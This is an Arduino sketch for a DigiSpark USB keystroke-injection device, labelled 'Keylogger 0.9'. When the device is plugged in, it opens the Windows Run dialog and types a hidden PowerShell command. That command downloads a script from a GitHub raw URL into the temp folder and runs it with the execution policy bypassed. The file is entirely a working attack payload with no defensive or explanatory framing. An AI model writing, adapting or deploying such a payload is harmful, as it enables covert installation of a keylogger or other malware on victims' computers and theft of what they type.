#include <DigiKeyboardFi.h>

void setup() {}

void loop() {
  // Description: Keylogger 0.9
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.sendKeyStroke(KEY_R,MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboardFi.print("powershell -w Hidden -c \"(New-Object System.Net.WebClient).DownloadFile(\'https://raw.githubusercontent.com/JorgeRamnA69/trabajo90jt32gvnhw3eo9/main/helper_post.ps1\', \\\"$env:Temp\\Script4.ps1\\\"); powershell -ExecutionPolicy Bypass \\\"$env:Temp\\Script4.ps1\\\"\"");
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(3000);
  exit(0);
}
